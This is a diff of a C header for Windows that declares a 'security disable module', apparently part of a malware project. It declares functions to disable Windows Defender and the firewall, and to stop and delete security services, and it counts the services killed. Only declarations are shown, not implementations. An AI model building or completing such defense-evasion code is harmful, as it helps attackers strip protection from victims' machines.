@@ -1,11 +1,24 @@
 #pragma once
+#ifndef SECURITY_H
+#define SECURITY_H
 #include <windows.h>
+#include <stdbool.h>
 
-/* Stop and disable security services + firewall */
-void KillSecurity(void);
+/* ============================================================
+ * SECURITY DISABLE MODULE
+ * Disables Windows Defender, firewall, and security services
+ * ============================================================ */
 
-/* Disable Windows Defender via registry policies */
-void DisableDefender(void);
+/* Core Functions */
+bool SecurityDisableDefender(void);
+bool SecurityKillSecurityServices(void);
+bool SecurityDisableFirewall(void);
 
-/* Manage a single service (stop, disable, delete) */
-void ManageService(const char *svcName);
+/* Service Management */
+bool SecurityManageService(const char *svcName, bool stop_and_delete);
+
+/* Reporting */
+int SecurityGetLastError(void);
+DWORD SecurityGetServicesKilled(void);
+
+#endif
